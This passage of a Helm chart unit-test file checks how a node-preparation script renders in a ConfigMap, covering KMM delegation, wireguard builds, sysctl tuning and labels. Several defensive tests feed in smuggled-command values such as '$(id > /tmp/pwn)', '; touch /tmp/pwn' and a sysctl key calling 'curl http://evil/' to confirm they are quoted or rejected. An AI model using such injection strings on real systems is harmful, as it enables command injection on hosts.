          path: data["ensure-modules.sh"]
          pattern: 'V4L2_DEVICES'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_SOURCE_REPO'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'video_devices_present'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'videodev'
      # ...and with it the whole build machinery, since no module is built here any more.
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_build_deps'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'stage_source'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'sign_module'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apt-get'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'pkg_install'
      # The tuning the DaemonSet is still there for renders unchanged.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_sysctls \|\| pass_status=1'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'apply_sysctl ''fs\.inotify\.max_user_instances'' ''1024'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'while true; do'

  - it: keeps the wireguard build while v4l2loopback is delegated to KMM
    set:
      modules:
        v4l2loopback:
          method: kmm
          kmm:
            image:
              registry: registry.contoso.com
              repository: kasm/v4l2loopback
        wireguard:
          enabled: true
    asserts:
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_v4l2loopback'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_wireguard \|\| pass_status=1'
      # The build machinery survives, because wireguard still needs it -- git included, since
      # wireguard has no sourcePath.
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'ensure_build_deps'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'command -v git >/dev/null 2>&1'

  # No module built here (wireguard off, v4l2loopback on KMM) and no tuning: nothing for the
  # reconcile loop to do, so there is no script and no ConfigMap to hold it. The Module CR is the
  # whole install.
  - it: renders no configmap at all for a kmm-only install with tuning off
    set:
      modules:
        v4l2loopback:
          method: kmm
          kmm:
            image:
              registry: registry.contoso.com
              repository: kasm/v4l2loopback
        wireguard:
          enabled: false
      tuning:
        sysctls:
          enabled: false
        swap:
          enabled: false
    asserts:
      - hasDocuments:
          count: 0

  - it: carries the standard chart labels
    asserts:
      - equal:
          path: metadata.labels["app.kubernetes.io/name"]
          value: kasm-node-prep
      - equal:
          path: metadata.labels["app.kubernetes.io/component"]
          value: node-prep
      - equal:
          path: metadata.labels["app.kubernetes.io/part-of"]
          value: kasm-ai
      - equal:
          path: metadata.labels["app.kubernetes.io/managed-by"]
          value: Helm
      - equal:
          path: metadata.labels["helm.sh/chart"]
          value: kasm-node-prep-0.1.0

  - it: single-quotes every value that lands in the script so shell metacharacters stay literal
    set:
      modules:
        v4l2loopback:
          sourceRepo: https://example.com/x$(id > /tmp/pwn).git
          sourceRef: "v1; touch /tmp/pwn"
      tuning:
        swap:
          enabled: true
          hostPath: /mnt/kasm`id`
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_SOURCE_REPO=''https://example\.com/x\$\(id > /tmp/pwn\)\.git'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_SOURCE_REF=''v1; touch /tmp/pwn'''
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'SWAP_DIR=''/mnt/kasm`id`'''
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'V4L2_SOURCE_REPO="'

  - it: escapes a single quote inside a value instead of letting it close the quoting
    set:
      modules:
        v4l2loopback:
          sourceRef: "v0.13'; id; echo '"
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: "V4L2_SOURCE_REF='v0\\.13'\\\\''; id; echo '\\\\'''"

  - it: rejects a sysctl key that is not a valid sysctl name
    set:
      tuning:
        sysctls:
          enabled: true
          values:
            "net.ipv4.ip_forward; curl http://evil/": "1"
    asserts:
      - failedTemplate:
          errorPattern: 'tuning.sysctls.values key .* is not a valid sysctl name'

  - it: rejects a sysctl value with shell metacharacters
    set:
      tuning:
        sysctls:
          enabled: true
          values:
            net.ipv4.ip_forward: "1$(id)"
    asserts:
      - failedTemplate:
          errorPattern: 'has an unexpected value'

  - it: rejects credentials embedded in the source repository url
    set:
      modules:
        v4l2loopback:
          sourceRepo: https://deploy:glpat-secret@git.example.com/mirrors/v4l2loopback.git
    asserts:
      - failedTemplate:
          errorPattern: 'sourceRepo carries credentials in the URL.*sourceRepoSecret'

  - it: hands a source repository login to git through a credential helper, never the url
    set:
      modules:
        v4l2loopback:
          sourceRepoSecret: v4l2loopback-git
    asserts:
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'credential.helper='
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'stage_source "\$V4L2_SOURCE_REPO" "\$V4L2_SOURCE_REF" "\$src" "\$V4L2_SOURCE_PATH" "\$\{V4L2_GIT_USERNAME:-\}" "\$\{V4L2_GIT_PASSWORD:-\}"'
      - matchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'log "Cloning \$\(scrub_url "\$repo"\)'
      - notMatchRegex:
          path: data["ensure-modules.sh"]
          pattern: 'v4l2loopback-git'

